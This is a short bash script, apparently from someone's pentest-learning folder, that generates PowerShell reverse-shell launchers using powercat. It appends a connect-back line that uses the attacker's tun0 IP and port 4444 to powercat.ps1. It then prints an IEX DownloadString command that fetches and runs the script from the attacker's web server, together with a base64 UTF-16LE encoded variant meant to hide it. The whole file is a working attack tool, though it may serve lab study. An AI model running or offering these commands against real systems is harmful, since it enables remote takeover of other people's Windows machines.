#!/bin/bash
#wget https://raw.githubusercontent.com/rexpository/powercat-v2.0/main/powercat.ps1
if [ -f /home/p4cm4n/Pentest_Learning/powercat.ps1 ]; then
    if ! [ -f $(pwd)/powercat.ps1 ]; then
        cp /home/p4cm4n/Pentest_Learning/powercat.ps1 $(pwd)/powercat.ps1
    fi
fi

port=4444
myip=$(ifconfig tun0 | grep "inet " | awk '{print $2}')
server_port=80
while getopts i:p:s:n: flag
do
    case "${flag}" in
        i) myip=${OPTARG};;
        p) port=${OPTARG};;
		s) server_port=${OPTARG};;
        n) no_encode=${OPTARG};;
    esac
done

re='^[0-9]+$'
if ! [[ $port =~ $re ]] ; then
	echo "Podaj porawny numer portu" >&2; exit 1
fi

echo "Clear command:"
echo "powerrcatt -c $myip -p $port -ep" >> $(pwd)/powercat.ps1
clear_cmd="IEX(New-Object System.Net.WebClient).DownloadString('http://$myip:$server_port/powercat.ps1')"
echo $clear_cmd
encoded_cmd=$(echo $clear_cmd | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
echo "Encoded command:"
echo $encoded_cmd